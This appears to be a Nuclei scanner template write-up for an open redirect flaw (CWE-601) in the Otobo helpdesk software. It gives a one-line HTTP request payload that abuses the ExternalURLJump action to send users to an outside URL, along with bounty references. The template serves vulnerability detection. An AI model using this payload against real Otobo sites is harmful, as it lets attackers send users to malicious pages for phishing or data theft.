# Nuclei Template: Otobo - Open Redirect
**Template ID:** otobo-open-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Medium
**CWE:** CWE-601
**Source:** Nuclei Template (`otobo-open-redirect.yaml`)

## Vulnerability Information & PoC

## Description
Otobo contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/otobo/index.pl?Action=ExternalURLJump;URL=http://www.interact.sh
```

## References
- https://huntr.dev/bounties/de64ac71-9d06-47cb-b643-891db02f2a1f/
- https://github.com/rotheross/otobo
